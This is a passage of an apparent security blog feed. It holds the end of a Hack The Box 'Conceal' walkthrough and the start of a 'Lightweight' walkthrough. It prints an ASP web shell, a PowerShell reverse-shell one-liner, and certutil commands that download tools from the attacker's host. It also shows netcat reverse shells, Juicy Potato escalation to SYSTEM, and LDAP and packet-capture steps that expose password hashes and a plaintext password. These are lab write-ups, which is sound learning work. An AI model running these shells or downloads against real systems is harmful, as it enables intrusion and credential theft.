&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_software&quot;))%&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;
&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
&amp;lt;%Response.Write(Request.ServerVariables(&quot;LOCAL_ADDR&quot;))%&amp;gt;
&amp;lt;% szCMD = request(&quot;cmd&quot;)
thisDir = getCommandOutput(&quot;cmd /c&quot; &amp;amp; szCMD)
Response.Write(thisDir)%&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;br&amp;gt;
&amp;lt;/BODY&amp;gt;
&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/17.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-a-powershell-reverse-shell-&quot;&gt;I got a powershell reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;payload-&quot;&gt;Payload :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&amp;gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-user&quot;&gt;We got user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag&quot;&gt;SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-user-the-privilege-escalation-is-easy-and-straightforward-before-doing-any-enumeration-i-checked-my-privileges-as-destitute-and-i-found-that-i-had-the-seimpersonateprivilege&quot;&gt;After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as &lt;code class=&quot;highlighter-rouge&quot;&gt;Destitute&lt;/code&gt; and I found that I had the &lt;code class=&quot;highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-means-that-we-can-apply-the-famous-attack-juicy-potato-you-can-read-about-it-on-the-official-github-repository-we-need-to-know-the-version-of-this-windows-to-pick-the-right-clsid&quot;&gt;This means that we can apply the famous attack &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt;. You can read about it on the &lt;a href=&quot;https://github.com/ohpe/juicy-potato&quot;&gt;official github repository&lt;/a&gt;. We need to know the version of this windows to pick the right &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-microsoft-windows-10-enterprise-i-got-the-clsid-of--wuauserv-from-here-which-is--e60687f7-01a1-40aa-86ac-db1cbf673334&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Microsoft Windows 10 Enterprise&lt;/code&gt;. I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt; of  &lt;code class=&quot;highlighter-rouge&quot;&gt;wuauserv&lt;/code&gt; from &lt;a href=&quot;https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise&quot;&gt;here&lt;/a&gt; which is : &lt;code class=&quot;highlighter-rouge&quot;&gt;{e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-got-a-compiled-binary-of-juicy-potato-from-the-github-repository-i-hosted-it-on-a-python-simple-http-server-then-i-downloaded-it-on-the-machine-with-certutil-&quot;&gt;I got a compiled binary of &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt; from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with &lt;code class=&quot;highlighter-rouge&quot;&gt;certutil&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-i-had-some-problems-with-my-powershell-reverse-shell-and-it-couldnt-run-juicypotatoexe-properly-so-i-got-another-cmd-shell-with-nc-&quot;&gt;However I had some problems with my powershell reverse shell and it couldn’t run &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; properly so I got another &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1339&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-created-a-bat-file-that-executes--ncexe--e-cmdexe-1010xxxx-1340-to-get-me-a-reverse-shell-&quot;&gt;I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file that executes : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1340&lt;/code&gt; to get me a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &amp;gt; rev.bat&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-ran-juicypotatoexe-and-made-it-execute-that-bat-file-&quot;&gt;Then I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; and made it execute that &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-fine-and-we-got-a-reverse-shell-as-nt-authoritysystem&quot;&gt;It worked fine and we got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Networking" /><category term="ftp" /><category term="Web" /><category term="RCE" /><summary type="html">Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/conceal/0.png" /></entry><entry><title type="html">Hack The Box - Lightweight</title><link href="http://localhost:4000/hack-the-box/lightweight/" rel="alternate" type="text/html" title="Hack The Box - Lightweight" /><published>2019-05-11T00:00:00+02:00</published><updated>2019-05-11T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lightweight</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lightweight/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-lightweight-retired-and-heres-my-write-up-about-it-lightweight-was-a-simple-and-a-straightforward-machine-i-had-fun-solving-it-and-i-liked-it-the-idea-behind-the-box-is-simple-we-get-initial-ssh-access-then-keep-escalating-privileges-until-we-reach-root-its-a-linux-machine-and-its-ip-is-101010119-i-added-it-to-etchosts-as-lightweighthtb-lets-jump-right-in&quot;&gt;Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.119&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lightweight.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC lightweight.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-ports-are-open--22-running-ssh-80-running-http-and-389-running-ldap-lets-check-ldap-first&quot;&gt;3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ldap-enumeration&quot;&gt;Ldap Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;to-enumerate-ldap-i-like-to-use-a-tool-called-ldapsearch-theres-also-an-nmap-script-called-ldap-search-that-can-do-the-same-thing&quot;&gt;To enumerate ldap I like to use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;, There’s also an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; that can do the same thing.&lt;/h4&gt;
&lt;h4 id=&quot;ldapsearch-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# extended LDIF
#
# LDAPv3
# base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# lightweight.htb
dn: dc=lightweight,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: lightweight htb
dc: lightweight

# Manager, lightweight.htb
dn: cn=Manager,dc=lightweight,dc=htb
objectClass: organizationalRole
cn: Manager
description: Directory Manager

# People, lightweight.htb
dn: ou=People,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: People

# Group, lightweight.htb
dn: ou=Group,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: Group

# ldapuser1, People, lightweight.htb
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
cn: ldapuser1
sn: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/ldapuser1

# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
cn: ldapuser2
sn: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/ldapuser2

# ldapuser1, Group, lightweight.htb
dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser1
userPassword:: e2NyeXB0fXg=
gidNumber: 1000

# ldapuser2, Group, lightweight.htb
dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser2
userPassword:: e2NyeXB0fXg=
gidNumber: 1001

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 8

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nmap-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script=ldap-search lightweight.htb&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script=ldap-search -o ldap.nmap lightweight.htb
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
| ldap-search: 
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001

# Nmap done at Fri May 10 17:11:03 2019 -- 1 IP address (1 host up) scanned in 17.35 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-ldapsearch-results-&quot;&gt;If we take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-some-info-for-2-users--ldapuser1-and-ldapuser2-userpassword-is-a-base64-encoded-string-i-decoded-it-and-got-the-same-hashes-i-got-from-ldap-search-nmap-script-&quot;&gt;We have some info for 2 users : &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;userPassword&lt;/code&gt; is a base64 encoded string. I decoded it and got the same hashes I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-i-tried-to-crack-the-hashes-and-they-didnt-crack-lets-check-http&quot;&gt;However, I tried to crack the hashes and they didn’t crack. Let’s check http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;usually-i-use-some-tools-for-web-like-gobuster-for-example-but-this-time-we-cant-do-that-because-we-will-get-blocked-as-you-can-see-&quot;&gt;Usually I use some tools for web like &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; for example, But this time We can’t do that because we will get blocked as you can see :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;also-the-info-page-is-saying-the-same-thing-&quot;&gt;Also the &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt; page is saying the same thing :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-also-saying-if-you-like-to-get-in-the-box-please-go-to-the-user-page-lets-check-user-&quot;&gt;And it’s also saying &lt;code class=&quot;highlighter-rouge&quot;&gt;If you like to get in the box, please go to the user page&lt;/code&gt;. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-can-login-with-ssh-with-the-ip-as-the-username-and-the-password-lets-try-&quot;&gt;So we can login with ssh with the ip as the username and the password. Let’s try :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-&quot;&gt;It’s working !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;tcpdump-capabilities-user-flag&quot;&gt;Tcpdump Capabilities, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;one-of-the-things-i-always-check-when-enumerating-linux-filesystem-is-the-binary-capabilities-so-i-used-getcap-on-some-directories-like-bin-usrbin-and-usrsbin-i-noticed-that-tcpdump-has-cap_net_admincap_net_rawep-capabilities&quot;&gt;One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt; on some directories like &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt;. I noticed that &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; has &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_net_admin,cap_net_raw+ep&lt;/code&gt; capabilities.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-the-linux-capabilities-manual-i-found-some-info-about-these-capabilities-&quot;&gt;From the &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;Linux Capabilities Manual&lt;/a&gt; I found some info about these capabilities :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**CAP_NET_ADMIN**
              Perform various network-related operations:
              * interface configuration;
              * administration of IP firewall, masquerading, and accounting;
              * modify routing tables;
              * bind to any address for transparent proxying;
              * set type-of-service (TOS)
              * clear driver statistics;
              * set promiscuous mode;
              * enabling multicasting;
              * use [setsockopt(2)](http://man7.org/linux/man-pages/man2/setsockopt.2.html) to set the following socket options:
                **SO_DEBUG**, **SO_MARK**, **SO_PRIORITY** (for a priority outside the
                range 0 to 6), **SO_RCVBUFFORCE**, and **SO_SNDBUFFORCE**.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; **CAP_NET_RAW**
              * Use RAW and PACKET sockets;
              * bind to any address for transparent proxying.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-i-ran-tcpdump-on-all-the-interfaces-and-saved-the-output-to-capturedpcap-and-i-left-it-for-some-time-&quot;&gt;Great. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; on all the interfaces and saved the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;captured.pcap&lt;/code&gt; and I left it for some time :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump -i any -w captured.pcap&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-downloaded-the-pcap-on-my-box-to-open-it-with-wireshark-&quot;&gt;I downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;pcap&lt;/code&gt; on my box to open it with &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-wireshark-i-noticed-an-ldap-request-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; I noticed an &lt;code class=&quot;highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-looked-at-it-and-found-that-its-an-authentication-request-&quot;&gt;I looked at it and found that it’s an authentication request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-have-the-password-for-ldapuser2--8bc8251332abe1d7f105d3e53ad39ac2-lets-su-&quot;&gt;Now we have the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; :	&lt;code class=&quot;highlighter-rouge&quot;&gt;8bc8251332abe1d7f105d3e53ad39ac2&lt;/code&gt;. Lets &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/14.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
